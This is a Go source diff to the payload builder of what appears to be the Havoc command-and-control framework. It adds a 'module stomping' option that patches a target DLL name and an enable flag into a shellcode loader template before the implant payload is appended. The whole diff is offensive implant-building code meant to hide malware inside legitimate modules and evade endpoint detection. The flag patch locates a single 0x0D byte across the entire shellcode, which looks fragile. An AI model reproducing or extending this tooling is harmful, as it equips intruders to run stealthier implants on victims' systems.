@@ -110,6 +110,9 @@ type Builder struct {
 		ListenerType   int
 		ListenerConfig any
 		Config         map[string]any
+
+		ModuleStomping       bool
+		ModuleStompingTarget string
 	}
 
 	ImplantOptions struct {
@@ -433,6 +436,17 @@ func (b *Builder) Build() bool {
 				return false
 			}
 
+			// patch in module stomping (target module + enable flag) when requested
+			if b.config.ModuleStomping {
+				ShellcodeTemplate, err = b.PatchModuleStomping(ShellcodeTemplate)
+				if err != nil {
+					logger.Error("Module stomping patch failed: " + err.Error())
+					b.SendConsoleMessage("Error", "module stomping patch failed: "+err.Error())
+					return false
+				}
+				b.SendConsoleMessage("Info", fmt.Sprintf("module stomping enabled [%s]", b.config.ModuleStompingTarget))
+			}
+
 			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
 			b.SendConsoleMessage("Info", fmt.Sprintf("shellcode payload [%v bytes]", len(Shellcode)))
 
@@ -486,6 +500,11 @@ func (b *Builder) SetArch(Arch int) {
 	b.config.Arch = Arch
 }
 
+func (b *Builder) SetModuleStomping(Enabled bool, Target string) {
+	b.config.ModuleStomping = Enabled
+	b.config.ModuleStompingTarget = Target
+}
+
 func (b *Builder) SetConfig(Config string) error {
 
 	err := json.Unmarshal([]byte(Config), &b.config.Config)
@@ -508,6 +527,59 @@ func (b *Builder) SetExtension(ext string) {
 
 func (b *Builder) GetOutputPath() string {
 	return b.outputPath
+}
+
+func (b *Builder) PatchModuleStomping(Template []byte) ([]byte, error) {
+	// marker & length must match the shellcode loader (payloads/Shellcode/Source/Entry.c)
+	var (
+		MarkerW       = "HAVOC_STOMP_TARGET"
+		TargetSlot    = 22            // WCHAR gStompTarget[22]  (21 chars + NUL)
+		DefaultTarget = "xmllite.dll" // compile-time default in Core.h
+		EnabledMarker = byte(0x0D)    // gStompEnabled default value
+	)
+
+	target := strings.ToLower(strings.TrimSpace(b.config.ModuleStompingTarget))
+	if target == "" {
+		target = DefaultTarget
+	}
+
+	if len(target) > TargetSlot-1 {
+		return nil, fmt.Errorf("module stomping target too long: %q (max %d chars)", target, TargetSlot-1)
+	}
+
+	// build the wide-char default marker and target (both fixed-width for replacement)
+	markerW := make([]byte, 0, TargetSlot*2)
+	for _, r := range MarkerW {
+		markerW = append(markerW, byte(r), 0x00)
+	}
+	for len(markerW) < TargetSlot*2 {
+		markerW = append(markerW, 0x00, 0x00)
+	}
+
+	targetW := make([]byte, 0, TargetSlot*2)
+	for _, r := range target {
+		targetW = append(targetW, byte(r), 0x00)
+	}
+	for len(targetW) < TargetSlot*2 {
+		targetW = append(targetW, 0x00, 0x00)
+	}
+
+	if !bytes.Contains(Template, markerW) {
+		return nil, errors.New("stomp target marker not found in shellcode template (rebuild payloads/Shellcode)")
+	}
+	Template = bytes.ReplaceAll(Template, markerW, targetW)
+
+	// flip the enable flag from its default to 1
+	count := bytes.Count(Template, []byte{EnabledMarker})
+	if count == 0 {
+		return nil, errors.New("stomp enabled marker not found in shellcode template (rebuild payloads/Shellcode)")
+	}
+	if count > 1 {
+		return nil, fmt.Errorf("stomp enabled marker is ambiguous (%d occurrences), refusing to patch", count)
+	}
+	Template = bytes.Replace(Template, []byte{EnabledMarker}, []byte{0x01}, 1)
+
+	return Template, nil
 }
 
 func (b *Builder) Patch(ByteArray []byte) []byte {
